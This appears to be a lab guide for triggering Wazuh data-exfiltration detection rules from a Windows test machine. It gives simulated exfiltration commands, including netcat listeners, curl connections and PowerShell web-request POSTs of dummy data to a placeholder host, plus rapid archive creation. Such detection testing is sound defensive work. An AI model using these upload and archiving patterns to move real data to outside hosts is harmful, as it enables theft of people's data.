# Data exfiltration detection tests

Commands to trigger each exfiltration rule from a Windows test machine. Replace `<MANAGER_IP>` with the address of your lab machine running the listener. Run the commands in an elevated PowerShell and filter the Wazuh dashboard by the rule ID shown.

No real data is sent: the commands post short dummy strings to a listener you control.

### Setup: Start listener on Kali (run this first, keep it running)

```powershell
# Run on Kali/Wazuh manager — keeps restarting after each connection:
while true; do nc -lvp 4444; done
# What it does: Listens on port 4444 and accepts connections from Windows
# Why needed: curl needs a real listener to make an established connection
# Without this, connection is refused and Sysmon does not log it
```

### Rule 100400: Exfiltration tool outbound connection

```powershell
# Run on Windows PowerShell (Admin):
curl.exe http://<MANAGER_IP>:4444 --max-time 5 --silent
# Check dashboard: rule.id: 100400
# Expected: Alert - Known data transfer tool making outbound TCP connection
```

### Rule 100402: Archive created by suspicious process

```powershell
# First create test files:
1..5 | ForEach-Object {
New-Item -Path "$env:TEMP\testfile_$_.txt" -ItemType File -Value "test data $_" -Force
}
# Then create archive using cmd (not PowerShell — that triggers 92212 instead):
cmd /c "cd %TEMP% && powershell Compress-Archive testfile_*.txt testcmd.zip -Force"
# Check dashboard: rule.id: 100402
# Expected: Alert - Archive created by suspicious process
```

### Rule 100403: PowerShell web upload

```powershell
# Run on Windows PowerShell (Admin) — must use powershell.exe -Command format:
powershell.exe -Command "Invoke-WebRequest -Uri 'http://<MANAGER_IP>:4444' -Method POST -Body 'sensitive data' -ErrorAction SilentlyContinue"
# Check dashboard: rule.id: 100403
# Expected: Alert - PowerShell using web request commands
# Note: Protocol violation error is normal — rule still fires from command line capture
```

### Rule 100410: Multiple transfer tool connections

```powershell
# IMPORTANT: Use 3 second delay — Sysmon deduplicates rapid repeated connections
1..5 | ForEach-Object {
curl.exe http://<MANAGER_IP>:4444 --max-time 3 --silent
Write-Host "Connection $_ done"
Start-Sleep -Seconds 3
}
# Check dashboard: rule.id: 100410
# Expected: Alert after 3rd connection - Multiple outbound connections detected
```

### Rule 100411: Multiple archives created rapidly

```powershell
# Create test files first if not already done:
1..5 | ForEach-Object {
New-Item -Path "$env:TEMP\testfile_$_.txt" -ItemType File -Value "test" -Force
}
# Then create multiple archives:
1..5 | ForEach-Object {
Compress-Archive -Path "$env:TEMP\testfile_*.txt" -DestinationPath "$env:TEMP\exfil_$_.zip" -Force
Start-Sleep -Milliseconds 500
}
# Check dashboard: rule.id: 100411
# Expected: Alert after 3rd archive - Multiple archives created by PowerShell
```

### Rule 100412: Repeated PowerShell uploads

```powershell
1..4 | ForEach-Object {
powershell.exe -Command "Invoke-WebRequest -Uri 'http://<MANAGER_IP>:4444' -Method POST -Body 'test' -ErrorAction SilentlyContinue"
Write-Host "Done $_"
Start-Sleep -Seconds 1
}
# Check dashboard: rule.id: 100412
# Expected: Alert - Repeated PowerShell web upload commands
```

### Rules 100420, 100421, 100422: CRITICAL rules

```powershell
# For 100420: Run the 100410 test TWICE within 2 minutes
# For 100421: Run the 100403 test with 6+ iterations in same session
# For 100422: Run the 100411 test TWICE within 2 minutes
# Check dashboard: rule.id: 100420 OR 100421 OR 100422
# Expected: CRITICAL level 15 alerts confirming sustained exfiltration campaign
```
